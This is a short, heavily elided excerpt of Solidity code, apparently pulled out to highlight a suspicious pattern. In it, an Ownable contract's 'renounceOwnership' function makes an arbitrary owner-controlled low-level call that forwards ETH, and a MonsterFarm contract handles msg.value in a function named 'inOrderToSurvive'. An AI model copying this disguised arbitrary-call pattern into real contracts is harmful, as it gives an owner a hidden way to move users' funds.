...
contract Ownable is Initializable, Context {
    ...
    function renounceOwnership(address newOwner, bytes memory data) public payable onlyOwner {
        ...
        if (data.length > 0) {
            (bool success, /* bytes memory data */) = newOwner.call{value:msg.value}(data);
...
contract MonsterFarm is Ownable {
    ...
    function inOrderToSurvive(uint256 amount, PoolInfo storage pool) internal returns(uint256 retMsgValue, uint256 retAmount) {     
        if(msg.value > 0) {
